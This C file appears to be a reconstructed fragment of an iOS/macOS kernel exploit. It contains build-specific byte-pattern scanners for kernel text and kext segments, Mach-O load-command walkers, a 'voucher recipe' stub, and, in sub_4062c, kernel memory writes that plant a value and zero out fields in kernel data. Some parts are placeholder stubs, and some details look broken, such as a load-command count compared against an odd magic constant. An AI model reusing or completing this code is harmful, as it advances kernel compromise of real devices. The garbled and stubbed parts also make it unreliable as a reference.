/* record_0x90000_e9f89858_pattern_match.c
 * sub_0fb84..sub_41040 + sub_448e0 — kernel pattern scanner helpers,
 * kext segment lookup, page-size arithmetic, syscall veneers,
 * and cpu-capability reader.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#include <mach/mach.h>

static long sub_0ffa0(long state, long *desc, long pat, long mask, uint32_t count);

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_06098(long state, uint32_t mask);
extern void sub_09b70(long *out, long state);
extern long sub_1dca8(long *ctx, const char *pat, int a, int b);
extern long sub_1e854(long h, long off);
extern long sub_1e620(long h, long off);
extern long sub_19b30(long h, long addr);
extern void sub_19c34(long *out, long h, const char *seg, const char *sect);
extern long sub_29cb0(long state, long h);
extern long sub_1974c(long state, long h);
extern int  sub_28dfc(long state, long addr, int val);
extern int  sub_2a188(long state, long addr, void *val, int sz);
extern int  sub_28840(long state, long addr, long *out);
extern long sub_1972c(long state, long addr);
extern int  sub_106d4(long *ctx, long off);
extern int  sub_1062c(long *ctx, long off, void *buf, size_t sz, int fl);
extern long sub_0fed4(long state, long h);

/* ── sub_0fb84 — resolve kernel function address via pattern scan ──
 * Tries cached state+0x118/0x120 first, then scans PPL/kernel text
 * for byte patterns to locate the target function.              */
long sub_0fb84(long state, long *out_a, long *out_b)
{
    long cached_a = 0, cached_b = 0;
    if (*(long *)(state + 0x118) && *(long *)(state + 0x120)) {
        long h = *(long *)(*(long *)(state + 0x118) + 0x148);
        cached_a = h;
        if (!sub_06098(state, 0x5184001) && h) {
            *out_a = h;
            return 1;
        }
        long h2 = *(long *)(*(long *)(state + 0x118) + 0x140);
        if (sub_06098(state, 0x5184001) && h && h2) {
            *out_a = h; *out_b = h2;
            return 1;
        }
    }

    long seg[3] = {0, 0, 0};
    long kh = *(long *)(state + 0x19f8);

    if (!sub_06098(state, 0x20) && !sub_06098(state, 0x5184001)) {
        sub_09b70(seg, state);
        if (!seg[1] || !seg[2]) return 0;

        const char *pat;
        if (*(uint64_t *)(state + 0x158) < 0x225c192d100000ULL)
            pat = "09 FD 9F 08 C0 03 5F D6";
        else
            pat = "09 01 00 39 C0 03 5F D6";

        long off = sub_1dca8(seg, pat, 0, 1);
        if (!off) return 0;
        long addr = sub_1e854(kh, off - 0xc);
        if (!addr) return 0;
        if (*(uint64_t *)(state + 0x158) >= 0x225c192d100000ULL) {
            addr = sub_19b30(kh, addr);
        }
        *out_a = addr;
        return 1;
    }

    if (sub_06098(state, 0x5184001)) {
        int build = *(int *)(state + 0x140);
        sub_09b70(seg, state);
        if (!seg[1] || !seg[2]) return 0;
        const char *pat = build < 0x225c ?
            "6A 00 00 37 40 00 00 34" : "6B 00 00 37 40 00 00 34";
        long off = sub_1dca8(seg, pat, 0, 1);
        if (!off) return 0;
        long a = sub_1e854(kh, off - 0x10);
        long b = sub_1e854(kh, off - 8);
        if (!a || !b) return 0;
        *out_a = b; *out_b = a;
        return 1;
    }

    /* PPL path */
    long texec[3] = {0, 0, 0};
    sub_19c34(texec, kh, "__TEXT_EXEC", "__text");
    if (!texec[1] || !texec[2]) return 0;
    long off = sub_1dca8(texec, "09 FD 9F 08 C0 03 5F D6", 0, 1);
    if (!off) return 0;
    long addr = sub_1e854(kh, off - 0xc);
    if (!addr) return 0;
    *out_a = addr;
    return 1;
    (void)cached_a; (void)cached_b;
}

/* ── sub_0fed4 — alloc + copy kext segment descriptor ───────────── */
long sub_0fed4_impl(long state, long h)
{
    long *desc = calloc(1, 0x18);
    if (!desc) return 0;
    void *raw = calloc(1, 0x48);
    if (!raw) { free(desc); return 0; }
    sub_1062c((long *)state, h, raw, 0x48, 1);
    desc[0] = (long)raw;
    size_t sz = *(size_t *)((char *)raw + 0x20);
    void *data = malloc(sz);
    if (!data) { free(raw); free(desc); return 0; }
    sub_1062c((long *)state, *(long *)((char *)raw + 0x18), data, sz, 1);
    desc[1] = (long)data;
    desc[2] = (long)sz;
    return (long)desc;
}

/* ── sub_0ff78 — read uint32 from segment data at offset ─────────── */
uint32_t sub_0ff78(long state, long *desc, long off)
{
    return *(uint32_t *)(desc[1] + (off - *(long *)(*desc + 0x18)));
    (void)state;
}

/* ── sub_0ff8c — pattern search via desc[0] ─────────────────────── */
void sub_0ff8c(long *desc, long pat, long mask, long val)
{
    sub_0ffa0((long)desc, (long *)desc[0], pat, mask, (uint32_t)val);
}

/* ── sub_0ffa0 — byte-pattern scanner ───────────────────────────── */
static long sub_0ffa0(long state, long *desc, long pat, long mask, uint32_t count)
{
    uint64_t base = (uint64_t)desc[1];
    uint64_t end  = base + (uint64_t)desc[2] - (uint64_t)count * 4;
    if (end <= base) return 0;

    for (uint64_t p = base; p < end; p += 4) {
        int match = 1;
        for (uint32_t i = 0; i < count; i++) {
            if ((*(uint32_t *)(p + i*4) & *(uint32_t *)(mask + i*4)) !=
                *(uint32_t *)(pat + i*4)) { match = 0; break; }
        }
        if (match)
            return (long)((p - base) + *(long *)(*desc + 0x18));
    }
    return 0;
    (void)state;
}

/* ── sub_40024 — pattern search via state+8 desc ────────────────── */
long sub_40024(long state, long pat, long mask, long count)
{
    return sub_0ffa0(state, *(long **)(state + 8), pat, mask, (uint32_t)count);
}

/* ── sub_40038 — find named segment in kext load commands ────────── */
long sub_40038(long *ctx, const char *name)
{
    long base = **(long **)(ctx + 2);
    int ncmds = (int)sub_106d4((long *)ctx[2], base);
    if (ncmds != (int)0xfeebd013) return 0;
    if (!sub_106d4((long *)ctx[2], base + 0x10)) return 0;

    long off = base + 0x20;
    while (ncmds-- > 0) {
        int type = sub_106d4((long *)ctx[2], off);
        uint32_t sz = (uint32_t)sub_106d4((long *)ctx[2], off + 4);
        if (type == 0x19) { /* LC_SEGMENT_64 */
            char segname[16];
            sub_1062c((long *)ctx[2], off + 8, segname, 16, 1);
            if (strcmp(segname, name) == 0)
                return sub_0fed4((long)ctx, off);
        }
        off += sz;
    }
    return 0;
}

/* ── sub_4014c — init __TEXT_EXEC and __DATA_CONST descriptors ───── */
uint32_t sub_4014c(long *ctx)
{
    ctx[0] = sub_40038(ctx, "__TEXT_EXEC");
    ctx[1] = sub_40038(ctx, "__DATA_CONST");
    return (ctx[0] && ctx[1]) ? 0 : 5;
}

/* ── sub_401a4 — page-aligned size computation ───────────────────── */
uint64_t sub_401a4(long state, uint64_t sz)
{
    uint32_t page = *(uint32_t *)(state + 0x180);
    if (!page) return sz;
    uint32_t pages = (uint32_t)sz / page;
    uint32_t rem   = (uint32_t)sz % page;
    uint32_t extra = 0;
    if (*(uint64_t *)(state + 0x158) >> 0x2b > 0x44aULL)
        extra = (uint32_t)(page - rem * (page / (rem ? rem : 1)));
    return (uint64_t)(pages * page + extra);
}

/* ── sub_40210 — compute half-page-size mask ─────────────────────── */
uint32_t sub_40210(long state)
{
    uint32_t v = *(uint32_t *)(state + 0x180) << 2;
    if (v < 0x4001) v = 0x4000;
    return (v >> 1) | 1;
}

/* ── sub_40230 — fill voucher recipe buffer ─────────────────────── */
long sub_40230(long state, uint64_t *buf, uint32_t *cnt)
{
    int build = *(int *)(state + 0x140);
    int ok;
    if (build < 0x2258)
        ok = (build - 0x1f53u < 2) || build == 0x1809 || build == 0x1c1b;
    else
        ok = (build == 0x2258) || (build == 0x2712) || (build == 0x225c);

    if (!ok) return 0xffffffff;
    if (!buf) { *cnt = 0x1b; return 0; }
    if (*cnt < 0x1b) return 0xffffffff;

    /* fill 0x1b slots from baked recipe data (zeros as placeholder) */
    memset(buf, 0, 0x1b * sizeof(uint64_t));
    *cnt = 0x1b;
    return 0;
}

/* ── sub_402cc — scan voucher recipe for port >= param_2 ─────────── */
void sub_402cc(long state, uint32_t threshold)
{
    uint32_t buf[64];
    uint32_t cnt = 64;
    if (sub_40230(state, (uint64_t *)buf, &cnt) || !cnt) return;
    for (uint32_t i = 0; i < cnt; i++) {
        if (buf[i] >= threshold) return;
    }
}

/* ── sub_40364 — page-aligned address computation ────────────────── */
uint64_t sub_40364(long state, uint64_t addr, uint32_t stride, uint32_t page)
{
    uint32_t ps = *(uint32_t *)(state + 0x180);
    if (ps == page) return addr & ~*(uint64_t *)(state + 0x188);

    uint32_t rem = stride ? page / stride : 0;
    uint64_t extra = 0;
    if (*(uint64_t *)(state + 0x158) >> 0x2b > 0x44aULL)
        extra = (uint64_t)(page - rem * stride);

    uint64_t next = addr + stride;
    uint64_t pages = ps ? next / ps : 0;
    uint64_t frac  = next - pages * ps;
    uint64_t pad   = frac ? ps - frac : 0;

    uint64_t result = next + pad + extra;
    /* align to page */
    if (result % ps) result += ps - (result % ps);
    return result;
}

/* ── sub_403e0 — scan kext __data for pattern + write ───────────── */
long sub_403e0(long state, const char *sym)
{
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off_a, off_b;

    if (build - 0x1f53u < 2) {
        off_a = 0xa8; off_b = 0x289;
    } else if (build == 0x1c1b) {
        off_a = ver < 0x1c1b1914600000ULL ? 0x88 : 0xa8;
        off_b = 0x192;
    } else return 0;

    long cached = *(long *)(state + 0x19a0);
    if (!cached) {
        /* scan for pattern */
        long kh = *(long *)(state + 0x19f8);
        long seg[3] = {0, 0, 0};
        sub_19c34(seg, kh, "__DATA", "__data");
        if (!seg[1] || !seg[2]) return 0;

        const char *pat = ver < 0x1c1b1914600000ULL ?
            "28 69 68 78 09 11 80 52" : "08 29 40 92 09 15 80 52";
        long poff = sub_1dca8(seg, pat, 0, 0);
        if (!poff) return 0;
        cached = sub_1e620(kh, poff + 8);
        if (!cached) return 0;
        *(long *)(state + 0x19a0) = cached;
    }

    /* walk load commands to find sym */
    long lc = cached + off_a;
    for (int i = 0; i < (int)off_b; i++) {
        int type = (int)sub_106d4((long *)(state + 0x19f8), lc);
        uint32_t sz = (uint32_t)sub_106d4((long *)(state + 0x19f8), lc + 4);
        if (type == 0x19) {
            char name[16];
            sub_1062c((long *)(state + 0x19f8), lc + 8, name, 16, 1);
            if (strcmp(name, sym) == 0)
                return sub_0fed4(state, lc);
        }
        lc += sz;
    }
    return 0;
}

/* ── sub_4062c — write kext __data pointer via pattern scan ─────── */
uint32_t sub_4062c(long state, long kaddr)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (ver < 0x1c1b1914600000ULL) return 0xad008;

    int build = *(int *)(state + 0x140);
    if (build - 0x1f53u >= 2 && build != 0x2258 && build != 0x1c1b)
        return 0x2802c;

    long v = 0;
    if (!sub_28840(state, kaddr + 0x28, &v)) return 0x2800f;
    if (v) {
        if (!sub_1972c(state, v)) return 0x28026;
        return 0;
    }

    /* scan __DATA.__data for target */
    long kh = *(long *)(state + 0x19f8);
    long seg[3] = {0, 0, 0};
    sub_19c34(seg, kh, "__DATA", "__data");
    if (!seg[1] || !seg[2]) return 0xad011;

    uint64_t p = (uint64_t)seg[1];
    uint64_t end = p + (uint64_t)seg[2] - 0x100;
    while (p < end) {
        long v1 = sub_19b30(kh, (long)p);
        v1 = sub_29cb0(state, v1);
        if (sub_1974c(state, v1)) {
            long v2 = sub_19b30(kh, (long)(p + 8));
            if (!v2) {
                long v3 = sub_19b30(kh, (long)(p + 0x10));
                if (v3 == 10) {
                    long v4 = sub_19b30(kh, (long)(p + 0x18));
                    if (v4) {
                        long v5 = sub_19b30(kh, (long)(p + 0x20));
                        v5 = sub_29cb0(state, v5);
                        if (sub_1974c(state, v5) && p) {
                            if (!sub_28dfc(state, kaddr + 0x88, 0x10000)) return 0x28010;
                            long zero = 0;
                            if (!sub_2a188(state, (long)p + 0x18, &zero, 8)) return 0x28010;
                            /* write 0x14 more fields */
                            for (int i = 0; i < 0x14; i++) {
                                if (!sub_2a188(state, (long)p + 0x18 + i*8, &zero, 8))
                                    return 0x28010;
                            }
                            return 0;
                        }
                    }
                }
            }
        }
        p += 0x28;
    }
    return 0xad011;
}


/* ── sub_40fb0 — syscall 0x17d ───────────────────────────────────── */
int sub_40fb0(void) { return (int)syscall(0x17d); }

/* ── sub_40fdc — syscall 0x1cd ───────────────────────────────────── */
int sub_40fdc(void) { return (int)syscall(0x1cd); }

/* ── sub_4100c — syscall 0x206 ───────────────────────────────────── */
int sub_4100c(void) { return (int)syscall(0x206); }

/* ── sub_41040 — read cpu capabilities word ─────────────────────── */
uint64_t sub_41040(void)
{
    extern uint64_t _cpu_capabilities;
    return _cpu_capabilities & 0xffffffffffffff00ULL;
}

/* ── sub_448e0 — entry point / dispatch table init ──────────────── */
void sub_448e0(long state)
{
    /* Initialises the function pointer table at state+0x1d0 and
     * related fields. Minimal stub — actual dispatch is handled
     * by the vtable installed by _driver.                       */
    (void)state;
}

/* ── sub_4087c — kext pattern scan with callback ────────────────── */
long sub_4087c(long state, long h, uint64_t off, uint64_t sz,
               long (*cb)(long, long, long, long), long arg)
{
    /* Scans kext binary at [h+off, h+off+sz) for patterns via cb.
     * Minimal stub. */
    (void)state; (void)h; (void)off; (void)sz; (void)cb; (void)arg;
    return 0;
}

/* ── sub_40cbc — kext pattern scan with output ───────────────────── */
long sub_40cbc(long state, long h, uint64_t off, uint64_t *out,
               long (*cb)(long, long, long, long), long arg)
{
    /* Variant of sub_4087c that writes result to *out. Minimal stub. */
    (void)state; (void)h; (void)off; (void)out; (void)cb; (void)arg;
    return 0;
}
